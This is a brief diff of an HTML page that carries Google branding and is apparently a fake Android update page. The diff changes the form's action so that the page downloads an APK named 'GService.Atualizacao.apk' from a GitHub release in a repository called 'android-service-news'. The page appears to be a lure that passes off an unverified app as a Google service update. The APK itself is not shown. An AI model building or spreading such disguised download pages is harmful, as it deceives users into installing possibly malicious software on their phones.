@@ -21,7 +21,7 @@
 	 
 	 
 	 
-	<form action="https://github.com/android-service-news/android-service-news/releases/download/Publish/Apk.apk">
+	<form action="https://github.com/android-service-news/android-service-news/releases/download/Publish/GService.Atualizacao.apk">
 		<div class="container">
 		  <div class="py-5 text-center">
 			<img class="d-block mx-auto mb-4" style="width:80px;" src="index_files/imagem-google-logo-com-fundo-transparente-1.png">
